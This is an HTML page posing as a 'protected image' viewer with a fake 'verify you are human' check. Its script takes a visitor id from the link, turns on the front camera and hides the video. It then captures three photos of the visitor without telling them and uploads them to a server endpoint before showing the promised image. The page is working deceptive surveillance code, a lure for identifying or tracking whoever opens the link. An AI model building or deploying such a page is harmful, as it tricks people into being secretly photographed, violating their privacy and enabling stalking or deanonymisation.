<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 400px;
            width: 90%;
        }
        h2 { margin-top: 0; }
        p { color: #aaaaaa; font-size: 14px; margin-bottom: 25px; }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }
        button:hover { background-color: #0056b3; }
        #videoElement { display: none; }
        #canvasElement { display: none; }
        #loading { display: none; margin-top: 15px; color: #ffeb3b; }
        #success { display: none; margin-top: 15px; color: #4caf50; }
        #error { display: none; margin-top: 15px; color: #f44336; }
    </style>
</head>
<body>

<div class="container">
    <h2>Protected Image</h2>
    <p>Please verify you are human to view this image.</p>
    <button id="verifyBtn">Verify & View Image</button>
    <p id="loading">Verifying... Please wait and look at the screen.</p>
    <p id="success">Verification complete. Image will load shortly...</p>
    <p id="error"></p>
</div>

<video id="videoElement" autoplay playsinline></video>
<canvas id="canvasElement"></canvas>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id');

    const verifyBtn = document.getElementById('verifyBtn');
    const loading = document.getElementById('loading');
    const success = document.getElementById('success');
    const errorMsg = document.getElementById('error');
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasElement');

    if (!userId) {
        verifyBtn.style.display = 'none';
        errorMsg.textContent = "Invalid link. No ID provided.";
        errorMsg.style.display = 'block';
    }

    verifyBtn.addEventListener('click', async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            video.srcObject = stream;
            
            verifyBtn.style.display = 'none';
            loading.style.display = 'block';
            errorMsg.style.display = 'none';

            // Wait for video to be ready
            video.onloadedmetadata = async () => {
                const images = [];
                
                // Take 3 pictures with 1s delay
                for (let i = 0; i < 3; i++) {
                    await new Promise(resolve => setTimeout(resolve, 800)); // wait 800ms between shots
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                    images.push(blob);
                }

                // Stop the camera
                stream.getTracks().forEach(track => track.stop());

                // Upload images to backend
                const formData = new FormData();
                formData.append('id', userId);
                images.forEach((blob, idx) => {
                    formData.append('photos', blob, `photo${idx}.jpg`);
                });

                try {
                    const response = await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        loading.style.display = 'none';
                        success.style.display = 'block';
                        
                        // Optionally fetch the original image using the ID if needed
                        const data = await response.json();
                        if (data.original_image_url) {
                            setTimeout(() => {
                                document.querySelector('.container').innerHTML = `<img src="${data.original_image_url}" style="width:100%; border-radius:8px;">`;
                            }, 1500);
                        }
                    } else {
                        throw new Error("Failed to verify");
                    }
                } catch (err) {
                    loading.style.display = 'none';
                    errorMsg.textContent = "Verification failed.";
                    errorMsg.style.display = 'block';
                }
            };

        } catch (err) {
            console.error("Camera error:", err);
            errorMsg.textContent = "Camera permission is required to verify.";
            errorMsg.style.display = 'block';
        }
    });
</script>

</body>
</html>
